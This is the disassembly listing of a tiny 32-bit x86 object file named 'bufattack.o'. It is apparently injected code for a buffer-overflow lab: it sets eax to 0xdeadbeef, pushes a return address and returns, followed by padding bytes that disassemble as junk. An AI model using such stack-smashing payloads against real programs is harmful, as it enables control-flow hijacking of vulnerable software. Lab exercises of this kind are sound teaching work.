
bufattack.o:     file format elf32-i386

Disassembly of section .text:

00000000 <.text>:
   0:	68 28 85 04 08       	push   $0x8048528
   5:	b8 ef be ad de       	mov    $0xdeadbeef,%eax
   a:	c3                   	ret    
   b:	90                   	nop    
   c:	e8 ef ff bf bc       	call   0xbcc00000
  11:	ef                   	out    %eax,(%dx)
  12:	ff                   	(bad)  
  13:	bf 00 00 00 00       	mov    $0x0,%edi
